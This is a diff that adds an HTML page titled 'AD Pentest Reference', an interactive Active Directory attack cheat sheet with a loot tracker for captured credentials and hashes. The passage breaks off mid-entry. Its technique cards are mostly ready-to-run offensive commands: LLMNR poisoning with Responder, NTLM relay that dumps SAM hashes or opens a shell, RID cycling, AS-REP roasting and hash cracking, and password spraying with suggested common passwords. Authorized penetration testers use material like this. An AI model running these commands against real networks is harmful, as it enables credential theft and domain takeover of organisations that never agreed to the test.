@@ -1,0 +1,3218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AD Pentest Reference</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0d1117;--bg2:#161b22;--bg3:#1c2128;--border:#30363d;
+  --text:#e6edf3;--text2:#8b949e;
+  --blue:#58a6ff;--green:#2ea043;--red:#f85149;--orange:#ffa657;--purple:#a371f7;--yellow:#d29922;
+}
+body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;font-size:14px;line-height:1.5;display:flex;min-height:100vh}
+#sidebar{width:260px;min-width:260px;background:var(--bg2);border-right:1px solid var(--border);padding:16px;position:sticky;top:0;height:100vh;overflow-y:auto}
+#sidebar h1{font-size:13px;font-weight:700;letter-spacing:1.5px;color:var(--text);margin-bottom:16px;padding-bottom:12px;border-bottom:1px solid var(--border);text-transform:uppercase}
+.fg{margin-bottom:14px}
+.fg-label{font-size:10px;font-weight:700;letter-spacing:1px;color:var(--text2);margin-bottom:6px;text-transform:uppercase}
+.fg-hint{font-size:10px;color:var(--text2);cursor:help;opacity:.6;text-transform:none;letter-spacing:0;font-weight:400}
+/* ── Flow & Tracker view ──────────────────────────────── */
+#view-tabs{display:flex;gap:6px;margin-bottom:14px}
+.vtab{background:var(--bg3);border:1px solid var(--border);color:var(--text2);padding:5px 14px;border-radius:6px;cursor:pointer;font-size:12px;font-weight:600;letter-spacing:.3px;transition:all .15s}
+.vtab:hover{border-color:#484f58;color:var(--text)}
+.vtab.active{border-color:var(--blue);color:var(--text)}
+#flow-view{display:none}
+#loot-tracker{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:14px;margin-bottom:12px}
+#loot-hdr{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px}
+#loot-hdr-title{font-size:11px;font-weight:700;color:var(--text);text-transform:uppercase;letter-spacing:1px}
+#loot-hdr-btns{display:flex;gap:6px}
+.loot-btn{background:var(--bg3);border:1px solid var(--border);color:var(--text2);padding:3px 10px;border-radius:4px;cursor:pointer;font-size:11px;transition:all .15s}
+.loot-btn:hover{border-color:var(--blue);color:var(--blue)}
+#loot-infra{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:8px;margin-bottom:10px}
+.li-field>label{display:block;font-size:9px;text-transform:uppercase;letter-spacing:.8px;color:var(--text2);font-weight:700;margin-bottom:3px}
+.li-field input{width:100%;background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:5px 8px;border-radius:4px;font-size:12px;outline:none;font-family:inherit;transition:border-color .15s}
+.li-field input:focus{border-color:var(--blue)}
+.li-field input::placeholder{color:#484f58}
+#l-access-wrap{margin-bottom:10px}
+#l-access-wrap>label{display:block;font-size:9px;text-transform:uppercase;letter-spacing:.8px;color:var(--text2);font-weight:700;margin-bottom:5px}
+#l-access-btns{display:flex;flex-wrap:wrap;gap:4px}
+.alevbtn{background:var(--bg3);border:1px solid var(--border);color:var(--text2);padding:3px 9px;border-radius:10px;cursor:pointer;font-size:11px;transition:all .15s}
+.alevbtn:hover{border-color:var(--blue);color:var(--text)}
+.alevbtn.on{background:#0d2a50;border-color:var(--blue);color:#79c0ff;font-weight:600}
+#loot-areas{display:grid;grid-template-columns:repeat(4,1fr);gap:8px}
+.la-field>label{display:block;font-size:9px;text-transform:uppercase;letter-spacing:.8px;color:var(--text2);font-weight:700;margin-bottom:3px}
+.la-field textarea{width:100%;height:90px;background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:6px 8px;border-radius:4px;font-size:11px;resize:vertical;outline:none;font-family:inherit;line-height:1.4;transition:border-color .15s}
+.la-field textarea:focus{border-color:var(--blue)}
+.la-field textarea::placeholder{color:#484f58}
+#flow-ph-hdr{display:flex;align-items:center;justify-content:space-between;margin-bottom:8px}
+#flow-ph-hdr>span{font-size:11px;font-weight:700;color:var(--text);text-transform:uppercase;letter-spacing:1px}
+#flow-reset-btn{background:transparent;border:1px solid var(--border);color:var(--text2);padding:3px 10px;border-radius:4px;cursor:pointer;font-size:11px;transition:all .15s}
+#flow-reset-btn:hover{border-color:var(--red);color:var(--red)}
+#flow-phases{display:flex;flex-direction:column;gap:6px}
+.ph-card{background:var(--bg2);border:1px solid var(--border);border-radius:8px;overflow:hidden}
+.ph-hdr{padding:10px 14px;display:flex;align-items:center;gap:10px;cursor:pointer;user-select:none;transition:background .1s}
+.ph-hdr:hover{background:var(--bg3)}
+.ph-dot{width:10px;height:10px;border-radius:50%;flex-shrink:0}
+.ph-title{font-weight:700;font-size:13px;color:var(--text);flex:1}
+.ph-prog{font-size:11px;color:var(--text2);white-space:nowrap;min-width:40px;text-align:right}
+.ph-jump{background:transparent;border:1px solid var(--border);color:var(--text2);padding:2px 9px;border-radius:4px;cursor:pointer;font-size:10px;transition:all .15s;white-space:nowrap}
+.ph-jump:hover{border-color:var(--blue);color:var(--blue)}
+.ph-chev{color:var(--text2);font-size:11px;transition:transform .2s;flex-shrink:0}
+.ph-card.open .ph-chev{transform:rotate(180deg)}
+.ph-body{display:none;padding:8px 14px 12px;border-top:1px solid var(--border)}
+.ph-card.open .ph-body{display:block}
+.ph-item{display:flex;align-items:flex-start;gap:8px;padding:5px 2px;cursor:pointer;border-radius:4px}
+.ph-item:hover .pi-txt{color:var(--text)}
+.pi-box{width:14px;min-width:14px;height:14px;border:1px solid #484f58;border-radius:3px;margin-top:2px;display:flex;align-items:center;justify-content:center;font-size:10px;color:transparent;transition:all .15s}
+.ph-item.done .pi-box{background:var(--green);border-color:var(--green);color:#fff}
+.ph-item.done .pi-txt{text-decoration:line-through;color:var(--text2)!important}
+.pi-txt{font-size:12px;color:#8b949e;line-height:1.5}
+@media(max-width:900px){#loot-areas{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:600px){#loot-areas{grid-template-columns:1fr};#loot-infra{grid-template-columns:repeat(2,1fr)}}
+.fb-wrap{display:flex;flex-wrap:wrap;gap:4px}
+.fb{background:var(--bg3);border:1px solid var(--border);color:var(--text2);padding:3px 9px;border-radius:12px;cursor:pointer;font-size:11px;transition:all .15s;user-select:none;white-space:nowrap}
+.fb:hover{border-color:var(--blue);color:var(--text)}
+.fb.on{color:#fff}
+.fb[data-v="have-nocreds"].on{background:#5a1a1a;border-color:var(--red);color:var(--red)}
+.fb[data-v="have-username"].on{background:#3a2a10;border-color:var(--orange);color:var(--orange)}
+.fb[data-v="have-password"].on{background:#3a3210;border-color:var(--yellow);color:var(--yellow)}
+.fb[data-v="have-hash"].on{background:#2a1a50;border-color:var(--purple);color:var(--purple)}
+.fb[data-v="have-localadmin"].on{background:#0d2a50;border-color:var(--blue);color:var(--blue)}
+.fb[data-v="have-domainadmin"].on{background:#0a2a18;border-color:var(--green);color:var(--green)}
+.fb[data-v="have-foothold"].on{background:#1a1a3a;border-color:#79c0ff;color:#79c0ff}
+.fb[data-g="proto"].on{background:#0c1f3e;border-color:#1f6feb;color:#79c0ff}
+.fb[data-g="cat"].on{background:#1e1040;border-color:#6e40c9;color:#c9a4ff}
+#clear-btn{width:100%;margin-top:10px;padding:6px;background:transparent;border:1px solid var(--border);color:var(--text2);border-radius:6px;cursor:pointer;font-size:12px}
+#clear-btn:hover{border-color:var(--red);color:var(--red)}
+#main{flex:1;padding:20px;overflow-y:auto;min-width:0}
+#search{width:100%;background:var(--bg2);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:6px;font-size:14px;margin-bottom:10px;outline:none;transition:border-color .15s}
+#search:focus{border-color:var(--blue)}
+#search::placeholder{color:var(--text2)}
+#count{font-size:12px;color:var(--text2);margin-bottom:14px;display:block}
+#cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(400px,1fr));gap:10px;align-items:start}
+.card{background:var(--bg2);border:1px solid var(--border);border-radius:8px;overflow:hidden;transition:border-color .15s}
+.card:hover{border-color:#484f58}
+.ch{padding:12px 14px 8px;cursor:pointer;display:flex;align-items:flex-start;justify-content:space-between;gap:8px}
+.ct{font-weight:600;font-size:13px;color:var(--text);line-height:1.3}
+.cv{color:var(--text2);font-size:11px;margin-top:2px;flex-shrink:0;transition:transform .2s}
+.card.open .cv{transform:rotate(180deg)}
+.ctags{padding:0 14px 10px;display:flex;flex-wrap:wrap;gap:4px}
+.tag{font-size:10px;padding:1px 7px;border-radius:10px;font-weight:500;white-space:nowrap;border:1px solid transparent}
+.t-have-nocreds{background:#3d1010;color:#f85149;border-color:#5a2020}
+.t-have-username{background:#2d1f0e;color:#ffa657;border-color:#4a3010}
+.t-have-password{background:#2d260a;color:#d29922;border-color:#4a3e10}
+.t-have-hash{background:#231640;color:#a371f7;border-color:#3a2060}
+.t-have-localadmin{background:#0d2340;color:#58a6ff;border-color:#1a3555}
+.t-have-domainadmin{background:#0d2618;color:#2ea043;border-color:#1a3f25}
+.t-proto-smb,.t-proto-ldap,.t-proto-kerberos{background:#0c1f3e;color:#79c0ff;border-color:#1e3a6e}
+.t-proto-winrm,.t-proto-rdp,.t-proto-ssh{background:#0d2618;color:#56d364;border-color:#1a3f25}
+.t-proto-mssql{background:#231640;color:#d2a8ff;border-color:#3a2060}
+.t-proto-network{background:#1c1f24;color:#8b949e;border-color:#30363d}
+.t-proto-dns{background:#0c1f3e;color:#79c0ff;border-color:#1e3a6e}
+.t-have-foothold{background:#1a1a3a;color:#79c0ff;border-color:#2a2a6a}
+.t-cat-enum{background:#0c2040;color:#58a6ff;border-color:#1e3a6e}
+.t-cat-spray{background:#2d1f0e;color:#ffa657;border-color:#4a3010}
+.t-cat-dump{background:#3d1010;color:#f85149;border-color:#5a2020}
+.t-cat-lateral{background:#231640;color:#a371f7;border-color:#3a2060}
+.t-cat-privesc{background:#2d260a;color:#d29922;border-color:#4a3e10}
+.t-cat-persist{background:#1c1f24;color:#8b949e;border-color:#30363d}
+.t-cat-adcs{background:#0d2618;color:#56d364;border-color:#1a3f25}
+.t-cat-bloodhound{background:#3d1a10;color:#ff7b72;border-color:#5a2820}
+.t-cat-delegation{background:#0c2040;color:#79c0ff;border-color:#1e3a6e}
+.t-cat-trusts{background:#2a1a40;color:#c9a4ff;border-color:#3a2a5a}
+.t-cat-exploit{background:#3d1010;color:#ff7b72;border-color:#5a1a1a}
+.fb[data-v="have-adcs"].on{background:#0d3020;border-color:#3fb950;color:#3fb950}
+.fb[data-v="have-exchange"].on{background:#3a1a0a;border-color:var(--orange);color:var(--orange)}
+.fb[data-g="cat"][data-v="cat-coerce"].on{background:#3a0a0a;border-color:#f85149;color:#ff7b72}
+.fb[data-g="cat"][data-v="cat-relay"].on{background:#2a1a40;border-color:#a371f7;color:#d2a8ff}
+.t-have-adcs{background:#0d2618;color:#3fb950;border-color:#1a4025}
+.t-have-exchange{background:#2d1a0a;color:#ffa657;border-color:#4a2a10}
+.t-cat-coerce{background:#2d0a0a;color:#ff7b72;border-color:#5a1010}
+.t-cat-relay{background:#2a1a40;color:#d2a8ff;border-color:#3a2060}
+.cb{display:none;padding:0 14px 14px;border-top:1px solid var(--border)}
+.card.open .cb{display:block}
+.meta{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin:10px 0}
+.mi{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:6px 8px}
+.ml{font-size:9px;text-transform:uppercase;letter-spacing:.8px;color:var(--text2);font-weight:700;margin-bottom:2px}
+.mv{font-size:12px;color:var(--text)}
+.cblock{position:relative;margin:8px 0}
+.cblock pre{background:#0d1117;border:1px solid var(--border);border-radius:6px;padding:10px 12px;overflow-x:auto;font-family:'Cascadia Code','Fira Code',Consolas,monospace;font-size:11.5px;line-height:1.65;color:#e6edf3;padding-right:60px}
+.cpbtn{position:absolute;top:6px;right:6px;background:var(--bg3);border:1px solid var(--border);color:var(--text2);padding:2px 8px;border-radius:4px;cursor:pointer;font-size:10px}
+.cpbtn:hover{border-color:var(--blue);color:var(--blue)}
+.cpbtn.ok{color:var(--green);border-color:var(--green)}
+.note{background:#1c1f0e;border:1px solid #3a3a1a;border-left:3px solid var(--yellow);border-radius:4px;padding:6px 10px;font-size:12px;color:#d29922;margin:8px 0}
+.warn{background:#1c100e;border:1px solid #3a2018;border-left:3px solid var(--red);border-radius:4px;padding:6px 10px;font-size:12px;color:#f85149;margin:8px 0}
+.reflink{display:inline-block;color:var(--blue);font-size:11px;text-decoration:none;margin-top:6px}
+.reflink:hover{text-decoration:underline}
+.nores{text-align:center;color:var(--text2);padding:60px 20px;font-size:14px;grid-column:1/-1}
+@media(max-width:700px){body{flex-direction:column}#sidebar{width:100%;height:auto;position:relative;border-right:none;border-bottom:1px solid var(--border)}#cards{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<div id="sidebar">
+  <h1>AD Pentest Ref</h1>
+  <div class="fg">
+    <div class="fg-label">I Have <span class="fg-hint" title="Shows only techniques your current access level can perform. Higher selections imply lower ones (Domain Admin implies Local Admin implies Foothold etc). ADCS/Exchange must be selected separately.">&#x2139;</span></div>
+    <div class="fb-wrap">
+      <button class="fb" data-g="have" data-v="have-nocreds">No Creds</button>
+      <button class="fb" data-g="have" data-v="have-foothold">Foothold (shell)</button>
+      <button class="fb" data-g="have" data-v="have-username">Username</button>
+      <button class="fb" data-g="have" data-v="have-password">Password</button>
+      <button class="fb" data-g="have" data-v="have-hash">NTLM Hash</button>
+      <button class="fb" data-g="have" data-v="have-localadmin">Local Admin</button>
+      <button class="fb" data-g="have" data-v="have-domainadmin">Domain Admin</button>
+      <button class="fb" data-g="have" data-v="have-adcs">ADCS Present</button>
+      <button class="fb" data-g="have" data-v="have-exchange">Exchange Present</button>
+    </div>
+  </div>
+  <div class="fg">
+    <div class="fg-label">Protocol / Service</div>
+    <div class="fb-wrap">
+      <button class="fb" data-g="proto" data-v="proto-smb">SMB :445</button>
+      <button class="fb" data-g="proto" data-v="proto-ldap">LDAP :389</button>
+      <button class="fb" data-g="proto" data-v="proto-kerberos">Kerberos :88</button>
+      <button class="fb" data-g="proto" data-v="proto-winrm">WinRM :5985</button>
+      <button class="fb" data-g="proto" data-v="proto-rdp">RDP :3389</button>
+      <button class="fb" data-g="proto" data-v="proto-mssql">MSSQL :1433</button>
+      <button class="fb" data-g="proto" data-v="proto-ssh">SSH :22</button>
+      <button class="fb" data-g="proto" data-v="proto-network">Network</button>
+      <button class="fb" data-g="proto" data-v="proto-dns">DNS :53</button>
+    </div>
+  </div>
+  <div class="fg">
+    <div class="fg-label">Category</div>
+    <div class="fb-wrap">
+      <button class="fb" data-g="cat" data-v="cat-enum">Enumeration</button>
+      <button class="fb" data-g="cat" data-v="cat-spray">Spray</button>
+      <button class="fb" data-g="cat" data-v="cat-dump">Cred Dump</button>
+      <button class="fb" data-g="cat" data-v="cat-lateral">Lateral Move</button>
+      <button class="fb" data-g="cat" data-v="cat-privesc">Priv Esc</button>
+      <button class="fb" data-g="cat" data-v="cat-persist">Persistence</button>
+      <button class="fb" data-g="cat" data-v="cat-adcs">ADCS</button>
+      <button class="fb" data-g="cat" data-v="cat-bloodhound">BloodHound</button>
+      <button class="fb" data-g="cat" data-v="cat-delegation">Delegation</button>
+      <button class="fb" data-g="cat" data-v="cat-trusts">Trust Attack</button>
+      <button class="fb" data-g="cat" data-v="cat-exploit">CVE/Exploit</button>
+      <button class="fb" data-g="cat" data-v="cat-coerce">Coercion</button>
+      <button class="fb" data-g="cat" data-v="cat-relay">NTLM Relay</button>
+    </div>
+  </div>
+  <button id="clear-btn">Clear All Filters</button>
+</div>
+
+<div id="main">
+  <div id="view-tabs">
+    <button class="vtab active" data-view="cards">&#128269; Techniques</button>
+    <button class="vtab" data-view="flow">&#128203; Flow &amp; Tracker</button>
+  </div>
+
+  <!-- Techniques view -->
+  <div id="cards-section">
+    <input type="search" id="search" placeholder="Search techniques, commands, tools, protocols..." autocomplete="off">
+    <span id="count"></span>
+    <div id="cards"></div>
+  </div>
+
+  <!-- Flow & Tracker view -->
+  <div id="flow-view">
+    <div id="loot-tracker">
+      <div id="loot-hdr">
+        <span id="loot-hdr-title">&#127918; Loot Tracker</span>
+        <div id="loot-hdr-btns">
+          <button class="loot-btn" id="loot-copy-btn">&#128203; Copy Summary</button>
+          <button class="loot-btn" id="loot-clear-btn">Clear All</button>
+        </div>
+      </div>
+      <div id="loot-infra">
+        <div class="li-field"><label>DC IP</label><input id="l-dcip" placeholder="10.10.x.x" autocomplete="off"></div>
+        <div class="li-field"><label>Domain FQDN</label><input id="l-domain" placeholder="corp.local" autocomplete="off"></div>
+        <div class="li-field"><label>DC Hostname</label><input id="l-dchost" placeholder="DC01" autocomplete="off"></div>
+        <div class="li-field"><label>CA / ADCS Server</label><input id="l-ca" placeholder="CA IP or hostname" autocomplete="off"></div>
+        <div class="li-field"><label>Exchange Server</label><input id="l-exch" placeholder="Exchange IP" autocomplete="off"></div>
+        <div class="li-field"><label>Other (MSSQL, WSUS…)</label><input id="l-other" placeholder="host:port" autocomplete="off"></div>
+      </div>
+      <div id="l-access-wrap">
+        <label>Current Access Level</label>
+        <div id="l-access-btns">
+          <button class="alevbtn" data-v="nocreds">No Creds</button>
+          <button class="alevbtn" data-v="username">Username</button>
+          <button class="alevbtn" data-v="password">Password</button>
+          <button class="alevbtn" data-v="foothold">Foothold (shell)</button>
+          <button class="alevbtn" data-v="localadmin">Local Admin</button>
+          <button class="alevbtn" data-v="domainadmin">Domain Admin &#127881;</button>
+        </div>
+      </div>
+      <div id="loot-areas">
+        <div class="la-field"><label>Users Found</label><textarea id="l-users" placeholder="user1&#10;user2&#10;svc_account"></textarea></div>
+        <div class="la-field"><label>Credentials</label><textarea id="l-creds" placeholder="user:password&#10;jdoe:Summer2024!"></textarea></div>
+        <div class="la-field"><label>NT Hashes</label><textarea id="l-hashes" placeholder="user:NTLMhash&#10;admin:aad3b435..."></textarea></div>
+        <div class="la-field"><label>Notes / BloodHound Paths</label><textarea id="l-notes" placeholder="Kerberoast targets&#10;BloodHound edges&#10;Tickets / TGTs captured"></textarea></div>
+      </div>
+    </div>
+    <div id="flow-ph-hdr">
+      <span>Attack Flow Checklist</span>
+      <button id="flow-reset-btn">Reset All Checks</button>
+    </div>
+    <div id="flow-phases"></div>
+  </div>
+</div>
+
+<script>
+const D = [
+  {
+    title: 'Initial Windows Host Recon',
+    req: 'Foothold on a Windows machine',
+    gets: 'Domain name, DC IP, current user context, privileges',
+    tags: ['have-nocreds','cat-enum'],
+    cmd: `ipconfig /all              # Domain name, DNS = DC IP
+whoami                     # Current user
+whoami /groups             # Look for Domain Admins, Backup Operators, etc.
+whoami /priv               # SeDebugPrivilege, SeBackupPrivilege, SeImpersonatePrivilege
+net user                   # Local users
+net user /domain           # Domain users
+net group /domain          # Domain groups
+net group "Domain Admins" /domain
+net group "Enterprise Admins" /domain
+net localgroup Administrators
+systeminfo                 # OS, hotfixes, domain name
+hostname
+set                        # Env vars — can leak domain, username, paths
+netstat -ano               # Active connections + listening ports
+tasklist /svc              # Running services
+net share                  # Shared folders on this host
+
+# Find the DC
+nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>
+nltest /dclist:<domain>`,
+    note: 'DNS server in ipconfig = DC IP. SeImpersonatePrivilege on service account = Potato attack to SYSTEM.'
+  },
+  {
+    title: 'nmap — AD Port Scan',
+    req: 'Network access to target',
+    gets: 'Open ports, service versions, DC confirmation, vuln check',
+    tags: ['have-nocreds','proto-network','proto-smb','proto-ldap','cat-enum'],
+    cmd: `# Fast full port scan
+nmap -p- --min-rate 5000 -T4 <IP> -oN ports.txt
+
+# Service + version + scripts on key AD ports
+nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985 <IP> -oN svc.txt
+
+# Key AD ports:
+# 53    DNS (DC?)        88    Kerberos (= DC confirmed)
+# 135   RPC              139/445  SMB
+# 389/636  LDAP/LDAPS    3268/3269  Global Catalog
+# 5985/5986  WinRM        3389  RDP
+
+# Vulnerability scripts
+nmap --script smb-vuln-ms17-010 -p 445 <IP>           # EternalBlue
+nmap --script smb-vuln-cve-2020-1472 -p 445 <IP>      # ZeroLogon
+
+# Masscan for large subnets
+masscan -p 88,445,389,5985,3389 <subnet>/16 --rate=10000 -oG masscan.txt`,
+    note: 'Port 88 open = Domain Controller. 3268/3269 = Global Catalog (forest-wide LDAP).'
+  },
+  {
+    title: 'LLMNR / NBT-NS Poisoning — Responder',
+    req: 'Network access, LLMNR or NBT-NS enabled on network',
+    gets: 'Net-NTLMv2 hashes from any host that broadcasts a name lookup',
+    tags: ['have-nocreds','proto-network','cat-dump'],
+    cmd: `# Full poisoning mode (captures hashes)
+sudo responder -I eth0 -dwv
+
+# Analyze mode only — passive, no poisoning, safe recon
+sudo responder -I eth0 -A
+
+# Hashes saved to: /usr/share/responder/logs/
+
+# Crack captured Net-NTLMv2 hash
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`,
+    warn: 'Net-NTLMv2 hashes CANNOT be passed directly. They must be cracked (→ plaintext) or relayed (→ ntlmrelayx). Do NOT confuse with NTLM hashes.',
+    ref: 'https://www.cynet.com/attack-techniques-hands-on/llmnr-nbt-ns-poisoning-and-credential-access-using-responder/'
+  },
+  {
+    title: 'NTLM Relay Attack — ntlmrelayx',
+    req: 'Network access, SMB signing DISABLED on at least one target',
+    gets: 'SAM hashes from relayed machine, or interactive shell',
+    tags: ['have-nocreds','proto-smb','proto-network','cat-lateral','cat-dump'],
+    cmd: `# Step 1: Find hosts with SMB signing disabled
+crackmapexec smb <subnet>/24 --gen-relay-list targets.txt
+# OR
+nmap --script smb-security-mode -p 445 <subnet>/24
+
+# Step 2: Disable SMB+HTTP in Responder (we relay, not capture)
+# Edit /etc/responder/Responder.conf → SMB = Off, HTTP = Off
+
+# Step 3: Start ntlmrelayx
+impacket-ntlmrelayx -tf targets.txt -smb2support          # dump SAM
+impacket-ntlmrelayx -tf targets.txt -smb2support -i        # interactive shell
+impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"  # run command
+
+# Step 4: Run Responder to capture+relay
+sudo responder -I eth0 -dwv`,
+    note: 'Relay target must NOT be the same machine that made the request. Requires local admin on relay target to dump SAM.',
+    ref: 'https://shorsec.io/blog/ntlm-relay-and-smb-signing-dont-let-your-network-be-a-sitting-duck/'
+  },
+  {
+    title: 'SMB Null / Guest Session',
+    req: 'Network access to SMB port 445',
+    gets: 'User list, share list, domain info (if null sessions allowed)',
+    tags: ['have-nocreds','proto-smb','cat-enum'],
+    cmd: `# Test null + guest sessions
+crackmapexec smb <IP> -u '' -p ''
+crackmapexec smb <IP> -u 'guest' -p ''
+crackmapexec smb <IP> -u 'guest' -p '' --shares
+
+# List shares
+smbclient -N -L //<IP>
+smbclient //<IP>/<share> -U 'domain/guest%'
+
+# Full SMB/RPC/LDAP null session enum
+enum4linux-ng -A <IP> -oY enum_results
+
+# NetExec (nxc = successor to CrackMapExec)
+nxc smb <IP>
+nxc smb <IP> -u '' -p '' --shares`,
+    note: 'Non-default shares (HR, DEV, Accounting) are high value — always browse them for credential files.'
+  },
+  {
+    title: 'RID Cycling — User Enumeration via SID',
+    req: 'SMB null or guest session allowed',
+    gets: 'Full domain user list, groups, built-in accounts — no real creds needed',
+    tags: ['have-nocreds','proto-smb','cat-enum'],
+    cmd: `# Full RID cycling (brute-forces SIDs)
+impacket-lookupsid 'domain/guest'@<IP> -no-pass
+# OR with null:
+impacket-lookupsid anonymous@<IP>
+
+# Parse out usernames only
+impacket-lookupsid 'domain/guest'@<IP> -no-pass | grep SidTypeUser | awk -F'\\\\ ' '{print $2}' | awk '{print $1}' > users.txt
+
+# CME equivalent
+crackmapexec smb <IP> -u 'guest' -p '' --rid-brute`,
+    note: 'Works when guest/null SMB is allowed. Feed the resulting users.txt into AS-REP roasting or password spray.'
+  },
+  {
+    title: 'LDAP Anonymous Bind',
+    req: 'LDAP port 389 accessible, anonymous bind enabled on DC',
+    gets: 'Full domain enumeration: users, groups, computers, service accounts',
+    tags: ['have-nocreds','proto-ldap','cat-enum'],
+    cmd: `# Test anonymous bind
+ldapsearch -x -H ldap://<DC-IP> -b "DC=domain,DC=local"
+
+# Enumerate users
+windapsearch.py -d <domain> --dc-ip <DC-IP> -U
+python3 windapsearch.py -d <domain> --dc-ip <DC-IP> --custom "objectClass=*"
+
+# CME
+crackmapexec ldap <IP> -u '' -p ''
+nxc ldap <IP> -u '' -p ''`,
+    note: 'Look for: service accounts (svc-*, sql_*) with preauth disabled, Exchange groups (WriteDACL path), accounts with passwords in description.'
+  },
+  {
+    title: 'Kerbrute — Username Enumeration via Kerberos',
+    req: 'Kerberos port 88 reachable, wordlist of potential usernames',
+    gets: 'Valid domain usernames (no lockout risk)',
+    tags: ['have-nocreds','proto-kerberos','cat-enum'],
+    cmd: `# Enumerate valid usernames
+kerbrute userenum -d <domain> --dc <DC-IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+kerbrute userenum -d <domain> --dc <DC-IP> usernames.txt -o valid_users.txt
+
+# Common username formats to try:
+# jsmith, john.smith, john_smith, johns, jdoe, j.doe, johnds
+# Username Anarchy from employee names (LinkedIn):
+username-anarchy --input-file fullnames.txt --select-format first,flast,first.last,firstl > unames.txt`,
+    note: 'Kerberos enumeration does NOT trigger AD lockout counters on most configurations. Much safer than LDAP/SMB enumeration.'
+  },
+  {
+    title: 'AS-REP Roasting — No Creds Required',
+    req: 'List of valid usernames, Kerberos port 88 reachable',
+    gets: 'Crackable TGT hashes for users with pre-auth disabled',
+    tags: ['have-nocreds','have-username','proto-kerberos','cat-dump'],
+    cmd: `# With a username list (no creds)
+impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <DC-IP> -format hashcat
+
+# Loop through individual users
+while read u; do impacket-GetNPUsers <domain>/"$u" -request -no-pass -dc-ip <DC-IP> >> asrep.txt; done < users.txt
+
+# Crack the AS-REP hash
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+john asrep.txt --fork=4 -w=/usr/share/wordlists/rockyou.txt`,
+    note: 'Service accounts (Alfresco, etc.) often have pre-auth disabled. No password attempt = no lockout risk.'
+  },
+  {
+    title: 'Password Spray — Check Lockout Policy First',
+    req: 'Valid username list',
+    gets: 'Valid credentials',
+    tags: ['have-nocreds','have-username','proto-smb','proto-ldap','proto-kerberos','cat-spray'],
+    cmd: `# ALWAYS check lockout policy before spraying
+crackmapexec smb <DC-IP> --pass-pol
+nxc smb <DC-IP> --pass-pol
+net accounts /domain               # From Windows
+
+# Key fields: lockout threshold, observation window
+# Rule: stay at least 1 attempt BELOW threshold per window
+# Typical: 5 attempts / 30 min → max 1 password per 30-35 min
+
+# CME spray — SMB
+crackmapexec smb <DC-IP> -u users.txt -p 'Password123!' --continue-on-success
+crackmapexec smb <DC-IP> -u users.txt -p passwords.txt --continue-on-success --no-bruteforce
+
+# CME spray — LDAP (useful if SMB is firewalled)
+crackmapexec ldap <DC-IP> -u users.txt -p 'Password123!' --continue-on-success
+
+# CME spray — WinRM, RDP
+crackmapexec winrm <subnet>/24 -u users.txt -p 'Password123!'
+crackmapexec rdp <subnet>/24 -u users.txt -p 'Password123!'
+
+# Kerbrute spray — Kerberos (less NTLM noise)
+kerbrute passwordspray -d <domain> --dc <DC-IP> users.txt 'Password123!'`,
+    note: 'Good passwords to try: Password1, Welcome1, Company2024!, Season+Year!, <domain>123, P@ssw0rd'
+  },
+  {
+    title: 'Validate Creds + Subnet Sweep',
+    req: 'Username + password (or NTLM hash)',
+    gets: 'Which machines you have local admin on, WinRM/RDP access',
+    tags: ['have-username','have-password','proto-smb','proto-winrm','proto-rdp','cat-enum'],
+    cmd: `# Validate creds against DC
+crackmapexec smb <DC-IP> -u <user> -p <pass>
+# (Pwn3d!) = local admin on that machine
+
+# Sweep entire subnet
+crackmapexec smb <subnet>/24 -u <user> -p <pass>
+
+# Check WinRM access
+crackmapexec winrm <IP> -u <user> -p <pass>
+crackmapexec winrm <subnet>/24 -u <user> -p <pass>
+
+# Check RDP access
+crackmapexec rdp <subnet>/24 -u <user> -p <pass>
+
+# Check MSSQL
+crackmapexec mssql <subnet>/24 -u <user> -p <pass>
+
+# With hash instead of password
+crackmapexec smb <subnet>/24 -u <user> -H <NTLM-hash>`,
+    note: '(Pwn3d!) in CME output = confirmed local admin on that host.'
+  },
+  {
+    title: 'GetADUsers / GetADComputers — Full Domain List',
+    req: 'Valid domain credentials',
+    gets: 'All AD user accounts, all computer accounts with attributes',
+    tags: ['have-username','have-password','proto-ldap','cat-enum'],
+    cmd: `# All domain users with attributes
+impacket-GetADUsers -all -dc-ip <DC-IP> '<domain>/<user>:<pass>'
+
+# All domain computers
+impacket-GetADComputers -dc-ip <DC-IP> '<domain>/<user>:<pass>'
+
+# CME equivalent
+crackmapexec smb <DC-IP> -u <user> -p <pass> --users
+crackmapexec smb <DC-IP> -u <user> -p <pass> --groups
+crackmapexec smb <DC-IP> -u <user> -p <pass> --computers
+
+# ldapdomaindump — generates browsable HTML reports
+ldapdomaindump -u '<domain>\\<user>' -p '<pass>' <DC-IP> -o ldap_dump/
+# Open ldap_dump/index.html in browser`,
+    note: 'Use the resulting user list for AS-REP roasting and targeted Kerberoasting.'
+  },
+  {
+    title: 'BloodHound — Attack Path Collection',
+    req: 'Valid domain credentials',
+    gets: 'Full attack path graph: paths to DA, ACL misconfigs, delegation, sessions',
+    tags: ['have-username','have-password','proto-ldap','cat-bloodhound','cat-enum'],
+    cmd: `# Collect from Linux (bloodhound-python)
+bloodhound-python -u <user> -p <pass> -d <domain> -dc <DC-IP> -c All --zip
+bloodhound-python -u <user> -p <pass> -d <domain> -dc <DC-IP> -c DCOnly  # faster, DC only
+
